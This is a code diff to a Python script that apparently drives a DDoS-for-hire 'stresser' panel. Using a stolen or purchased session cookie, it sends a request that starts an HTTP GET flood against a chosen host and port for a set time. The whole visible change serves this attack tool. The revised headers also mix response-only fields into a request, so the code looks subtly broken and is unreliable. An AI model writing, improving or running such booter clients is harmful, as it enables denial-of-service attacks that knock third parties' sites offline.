@@ -30,19 +30,20 @@ def main():
 
     # Update the headers with the user-provided cookie
     headers = {
-        "Cookie": cookie,
-        "Sec-Ch-Ua": '"Chromium";v="125", "Not.A/Brand";v="24"',
-        "Sec-Ch-Ua-Mobile": "?0",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
-        "Sec-Ch-Ua-Platform": '"Windows"',
-        "Accept": "*/*",
-        "Sec-Fetch-Site": "same-origin",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Dest": "empty",
-        "Referer": "https://susstresser.xyz/panel/hub.php",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Priority": "u=1, i"
+        "alt-svc": 'h3=":443"; ma=86400',
+        "cache-control": "no-store, no-cache, must-revalidate",
+        "cf-cache-status": "DYNAMIC",
+        "content-encoding": "zstd",
+        "content-type": "text/html; charset=UTF-8",
+        "expires": "Thu, 19 Nov 1981 08:52:00 GMT",
+        "pragma": "no-cache",
+        "priority": "u=1,i",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "cookie": cookie,
+        "referer": "https://susstresser.xyz/panel/hub.php",
+        "accept": "*/*",
+        "accept-encoding": "gzip, deflate, br",
+        "accept-language": "en-US,en;q=0.9"
     }
 
     url = f"https://susstresser.xyz/panel/complexx/hub.php?type=start&host={host}&port=443&time={attack_time}&method=HTTPGET-FREE&totalservers=1&vip=0"
